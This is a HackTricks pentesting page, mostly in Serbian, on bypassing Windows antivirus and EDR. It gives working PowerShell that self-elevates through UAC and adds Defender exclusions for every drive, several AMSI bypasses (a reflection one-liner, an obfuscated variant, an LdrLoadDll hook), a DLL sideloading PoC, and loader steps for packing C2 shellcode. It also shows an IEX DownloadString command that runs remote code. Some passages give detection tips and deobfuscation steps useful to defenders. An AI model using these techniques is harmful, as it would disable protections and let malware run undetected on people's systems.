# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za onemogućavanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat koji zaustavlja Windows Defender tako što se pretvara da je drugi AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Mamac za UAC u stilu instalera pre nego što se dira Defender

Javni loaderi koji se predstavljaju kao varalice za igre često se distribuiraju kao nepotpisani Node.js/Nexe instaleri koji prvo **zatraže od korisnika povišenje privilegija** i tek potom neutralizuju Defender. Tok je jednostavan:

1. Proverava administratorski kontekst sa `net session`. Komanda uspeva samo kada pozivač ima administratorska prava, tako da neuspeh ukazuje da loader radi kao običan korisnik.
2. Odmah se ponovo pokreće sa `RunAs` verbom da bi se pokrenuo očekivani UAC prompt za saglasnost dok se čuva originalna komandna linija.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju “cracked” softver, pa se prompt obično prihvati, dajući malware-u prava koja su mu potrebna da promeni Defender-ovu politiku.

### Sveobuhvatni `MpPreference` izuzeci za svako slovo diska

Kada dobiju elevated privilegije, GachiLoader-style chains maksimalizuju Defender-ove slepe tačke umesto da servis u potpunosti onemoguće. Loader prvo ubije GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) i zatim gurne **izuzetno široke izuzetke** tako da svaki korisnički profil, sistemski direktorijum i uklonjivi disk postanu nepodložni skeniranju:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki mountovani fajl sistem (D:\, E:\, USB stikovi, itd.) tako da su **bilo koji budući payloadi ubačeni bilo gde na disku ignorisani**.
- Isključenje ekstenzije `.sys` je usmereno ka budućnosti — napadači ostavljaju opciju da kasnije učitaju unsigned drivere bez ponovnog diranja Defender-a.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što omogućava kasnijim fazama da potvrde da isključenja i dalje postoje ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedna Defender usluga nije zaustavljena, površni health check-ovi će i dalje prijavljivati “antivirus active” iako inspekcija u realnom vremenu nikad ne dotiče te putanje.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izdvajanje informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do detekcije, pošto su verovatno već analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe taj tip detekcije:

- **Encryption**

Ako enkriptuješ binarni fajl, AV neće imati načina da detektuje tvoj program, ali će ti trebati neki loader koji dekriptuje i pokrene program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti nekoliko stringova u binarnom fajlu ili skripti da prođeš pored AV-a, ali to može biti dugotrajan zadatak u zavisnosti od toga šta pokušavaš da obfuskuješ.

- **Custom tooling**

Ako razviješ sopstvene alate, neće postojati poznati loši potpisi, ali to zahteva mnogo vremena i truda.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Toplo preporučujem da pogledaš ovaj [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion.

### **Dynamic analysis**

Dynamic analysis je kada AV pokreće tvoj binarni fajl u sandbox-u i posmatra maliciozno ponašanje (npr. pokušaj dekriptovanja i čitanja lozinki iz browsera, pravljenje minidump-a LSASS-a, itd.). Ovaj deo može biti komplikovaniji za rad, ali evo nekoliko stvari koje možeš učiniti da zaobiđeš sandbox-e.

- **Sleep before execution** U zavisnosti od implementacije, može biti odličan način zaobilaženja dynamic analysis. AV-ovi imaju vrlo kratak vremenski okvir za skeniranje fajlova kako ne bi ometali rad korisnika, pa dugo spavanje može poremetiti analizu binarnih fajlova. Problem je što mnogi sandboxes mogu preskočiti sleep, zavisno od implementacije.
- **Checking machine's resources** Obično sandboxes imaju vrlo malo resursa na raspolaganju (npr. < 2GB RAM), da ne bi usporili korisnikov računar. Takođe možeš biti kreativan — proveravati temperaturu CPU-a ili brzinu ventilatora; nisu sve te stvari implementirane u sandbox-u.
- **Machine-specific checks** Ako ciljaš korisnika čije je radno mesto pridruženo domenu "contoso.local", možeš proveriti domen računara da vidiš da li se poklapa; ako se ne poklapa, možeš završiti program.

Ispostavilo se da je computername Sandbox-a Microsoft Defender-a HAL9TH, pa možeš proveriti ime računara u malveru pre detonacije — ako ime odgovara HAL9TH, znači da si u Defender-ovom sandbox-u i možeš ugasiti program.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još neki dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za rad protiv Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **public tools** će na kraju **biti detektovani**, pa treba da si postaviš pitanje:

Na primer, ako želiš da dump-uješ LSASS, **da li zaista moraš da koristiš mimikatz**? Ili bi mogao da koristiš neki drugi projekat koji je manje poznat i takođe dump-uje LSASS?

Pravi odgovor je verovatno drugo. Uzevši mimikatz kao primer, verovatno je jedan od najviše, ako ne i najviše flagovanih komada malvera od strane AV-ova i EDR-ova; iako je projekat odličan, zaobilaženje AV-a s njim je noćna mora, pa potraži alternative za ono što želiš da postigneš.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritizuj korišćenje DLL-ova za evasion** — iz mog iskustva, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, tako da je to vrlo jednostavan trik da se izbegne detekcija u nekim slučajevima (ako tvoj payload može da se pokrene kao DLL, naravno).

Kao što vidimo na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima 7/26 stopu detekcije.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da budeš mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava DLL search order koji koristi loader, pozicionirajući žrtvinu aplikaciju i maliciozne payload-e jedne pored drugih.

Možeš proveriti programe podložne DLL Sideloading pomoću [Siofra](https://github.com/Cybereason/siofra) i sledećeg powershell skripta:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite DLL Hijackable/Sideloadable programe**, ova tehnika je prilično neupadljiva ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće automatski pokrenuti vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje iz proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naše shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste saznali više o onome što smo detaljnije razmatrali.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules mogu eksportovati funkcije koje su zapravo "forwarders": umesto da upućuju na kod, export unos sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivač reši export, Windows loader će:

- Učitaće `TargetDll` ako već nije učitan
- Rešiće `TargetFunc` iz njega

Ključna ponašanja za razumevanje:
- Ako je `TargetDll` KnownDLL, isporučuje se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalan redosled pretrage DLL-ova, koji uključuje direktorijum modula koji obavlja forward resolution.

Ovo omogućava indirektnu sideloading primitivu: pronađite potpisani DLL koji eksportuje funkciju forwardovanu na ime modula koji nije KnownDLL, zatim postavite taj potpisani DLL u isti direktorijum kao i DLL koji kontroliše napadač, nazvan tačno kao ciljni modul na koji se forwarduje. Kada se pozove forwarded export, loader rešava forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer primećen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se rešava putem normalnog redosleda pretrage.

PoC (kopiraj i nalepi):
1) Kopirajte potpisani sistemski DLL u direktorijum u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni `DllMain` je dovoljan za izvršenje koda; ne morate implementirati prosleđenu funkciju da biste pokrenuli `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite forward pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Primećeno ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Dok rešava `KeyIsoSetAuditingInterface`, loader sledi forward ka `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što se `DllMain` već izvršio

Saveti za otkrivanje:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete izlistati forwarded exports alatima kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte Windows 11 forwarder inventory da biste pretražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Ideje za detekciju/odbranu:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Upozorite na lance procesa/modula kao što su: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` na putanjama zapisivim od strane korisnika
- Sprovodite politike integriteta koda (WDAC/AppLocker) i zabranite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što danas radi može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte kombinovati više evasion tehnika.

## Direktni/Indirektni Syscalls i rešavanje SSN (SysWhispers4)

EDRs često postavljaju user-mode inline hooks na `ntdll.dll` syscall stubs. Da biste zaobišli te hook-ove, možete generisati direktne ili indirektne syscall stubove koji učitavaju odgovarajući SSN (System Service Number) i prelaze u kernel mode bez izvršavanja hook-ovanog export entrypoint-a.

**Opcije poziva:**
- **Direct (embedded)**: ubacuje `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (bez poziva na `ntdll` export).
- **Indirect**: skoči u postojeći `syscall` gadget unutar `ntdll` tako da prelazak u kernel izgleda kao da potiče iz `ntdll` (korisno za heuristic evasion); **randomized indirect** bira gadget iz pool-a za svaki poziv.
- **Egg-hunt**: izbegava ugrađivanje statičkog `0F 05` opcode niza na disku; rešava syscall sekvencu u runtime-u.

Strategije za otkrivanje SSN otpornе na hook-ove:
- **FreshyCalls (VA sort)**: izvlači SSN sortiranjem syscall stubova po virtualnoj adresi umesto čitanja bajtova stuba.
- **SyscallsFromDisk**: mapira čist `\KnownDlls\ntdll.dll`, čita SSN iz njegovog `.text`, zatim unmapuje (zaobilazi sve in-memory hook-ove).
- **RecycledGate**: kombinuje VA-sortirano zaključivanje SSN sa validacijom opcode-a kada je stub čist; pada na VA zaključivanje ako je hooked.
- **HW Breakpoint**: postavi DR0 na `syscall` instrukciju i koristi VEH da uhvati SSN iz `EAX` u runtime-u, bez parsiranja hooked bajtova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AV rešenja mogla da skeniraju samo **files on disk**, pa ako biste nekako izvršili payload-e **directly in-memory**, AV nije mogao ništa da uradi jer nije imao dovoljno vidljivosti.

AMSI funkcija je integrisana u sledeće komponente Windows-a.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ona omogućava antivirusnim rešenjima da inspektuju ponašanje skripti izlažući sadržaj skripti u obliku koji nije enkriptovan niti obfuskovan.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeći alert na Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju kako dodaje prefiks `amsi:` a zatim putanju do izvršnog fajla iz kojeg je skripta pokrenuta — u ovom slučaju, powershell.exe.

Nismo ostavljali nijedan fajl na disku, ali smo i dalje uhvaćeni u memoriji zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` za učitavanje i izvršavanje u memoriji. Zbog toga se preporučuje korišćenje nižih verzija .NET-a (poput 4.7.2 ili niže) za in-memory izvršavanje ako želite da izbegnete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa statičkim detekcijama, izmenjivanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost deobfuskacije skripti čak i ako su obfuskovane u više slojeva, pa obfuskacija može biti loša opcija u zavisnosti od načina na koji je izvedena. To čini izbegavanje manje trivijalnim. Ipak, ponekad je dovoljno promeniti nekoliko naziva promenljivih i bićete u redu, tako da zavisi od toga koliko je nešto već označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se radi kao neprivilegovani korisnik. Zbog ovog propusta u implementaciji AMSI, istraživači su pronašli više načina da se zaobiđe AMSI skeniranje.

**Forcing an Error**

Prinuditi da AMSI inicijalizacija zakaže (amsiInitFailed) rezultiraće time da skeniranje neće biti pokrenuto za trenutni proces. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dovoljna je bila samo jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Ta linija je, naravno, bila označena od strane samog AMSI-ja, pa je potrebna neka modifikacija da bi se ova tehnika koristila.

Evo modifikovanog AMSI bypass-a koji sam uzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno kada ova objava izađe, zato ne objavljujte nikakav kod ako planirate da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je inicijalno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje ulaza koje korisnik obezbedi) i prepisivanje te funkcije instrukcijama koje vraćaju kod E_INVALIDARG; na taj način rezultat stvarnog skeniranja će vratiti 0, što se interpretira kao čist rezultat.

> [!TIP]
> Molimo pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan, nezavisan od jezika način zaobilaženja je postavljanje korisničkog hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i za taj proces se ne odvijaju skeniranja.

Skica implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Funkcioniše u PowerShell, WScript/CScript i prilagođenim loaderima (sve što bi inače učitalo AMSI).
- Kombinujte sa slanjem skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) kako biste izbegli duge artefakte komandne linije.
- Primećeno korišćenje od strane loadera pokretanih kroz LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Uklonite otkriveni potpis**

Možete koristiti alat kao što je **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite otkriveni AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa tražeći AMSI potpis, a zatim ga prepisuje NOP instrukcijama, efektivno uklanjajući ga iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je feature koji omogućava da evidentirate sve PowerShell komande izvršene na sistemu. To može biti korisno za auditing i troubleshooting, ali takođe može predstavljati problem za napadače koji žele da izbegnu detekciju.

Da biste zaobišli PowerShell logging, možete upotrebiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) u tu svrhu.
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI se neće učitati, pa možete pokretati skripte bez skeniranja od strane AMSI. Možete ovo uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawnujete powershell bez odbrane (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Nekoliko obfuscation techniques se oslanja na enkripciju podataka, što će povećati entropiju binarnog fajla i olakšati AVs i EDRs da ga detektuju. Budite oprezni s tim i možda primenjujte enkripciju samo na specifične sekcije koda koje su osetljive ili koje treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne forkove) često se nailazi na više slojeva zaštite koji blokiraju dekompajlere i sandbokse. Donji workflow pouzdano **vraća gotovo–originalni IL** koji potom može biti dekompajliran u C# alatima kao što su dnSpy ili ILSpy.

1.  Anti-tampering removal – ConfuserEx enkriptuje svaki *method body* i dekriptuje ga unutar statičkog konstruktora *module* (`<Module>.cctor`). Ovo takođe menja PE checksum pa će svaka izmena uzrokovati pad binarnog fajla. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, oporavite XOR ključeve i prepišete čist assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izgradnji vlastitog unpackera.

2.  Symbol / control-flow recovery – ubacite *clean* fajl u **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – odaberite ConfuserEx 2 profil  
• de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i imena promenljivih i dekriptovati konstante stringove.

3.  Proxy-call stripping – ConfuserEx zamenjuje direktne pozive metoda laganim wrapperima (a.k.a *proxy calls*) da dodatno poremeti dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto neprovidnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Manual clean-up – pokrenite dobijeni binarni fajl u dnSpy, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da locirate *real* payload. Često ga malware skladišti kao TLV-encoded byte array inicijalizovan unutar `<Module>.byte_0`.

Gore opisana lanac vraća tok izvršavanja **bez** potrebe za pokretanjem malicioznog sample-a – korisno kada radite na offline radnoj stanici.

> 🛈  ConfuserEx generiše custom atribut nazvan `ConfusedByAttribute` koji može biti korišćen kao IOC za automatsko triage-ovanje sample-ova.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog kompleta sposoban da poveća bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da generiše, u vreme kompajliranja, obfuscated code bez upotrebe eksternog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuscated operacija generisanih od strane C++ template metaprogramming framework-a, što će otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može obfuskovati razne pe fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike podržane od strane LLVM koji koristi ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly koda transformišući regularne instrukcije u ROP lančane, potkopavajući naše prirodno shvatanje normalnog toka kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može konvertovati postojeće EXE/DLL u shellcode i zatim ih učitati

## SmartScreen & MoTW

Možda ste videli ovaj ekran pri preuzimanju nekih izvršnih fajlova sa interneta i njihovom pokretanju.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

